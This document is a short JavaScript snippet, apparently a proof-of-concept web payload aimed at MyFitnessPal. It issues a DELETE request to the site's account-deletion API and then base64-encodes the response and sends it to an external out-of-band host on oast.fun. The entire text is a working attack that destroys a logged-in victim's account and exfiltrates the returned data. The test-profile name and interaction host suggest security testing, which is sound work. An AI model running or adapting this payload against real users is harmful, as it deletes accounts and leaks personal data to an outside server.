  fetch('https://www.myfitnesspal.com/api/services/account/delete', {
    method: 'DELETE',
    headers: {
      'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
      'Accept': '*/*',
      'Accept-Language': 'en-US,en;q=0.5',
      'Referer': 'https://www.myfitnesspal.com/profile/testooogh1',
      'Content-Type': 'application/json',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'If-None-Match': 'W/"10btolj6iso7r"',
      'Priority': 'u=4'
    }
  })
  .then(response => response.json())
  .then(data => fetch("https://qlczvvvmiqyxqynbxerdjf7auvwuhz7ow.oast.fun/?userdata="+btoa(JSON.stringify(data, null, 2))))
  .catch(error => console.error('Error:', error));
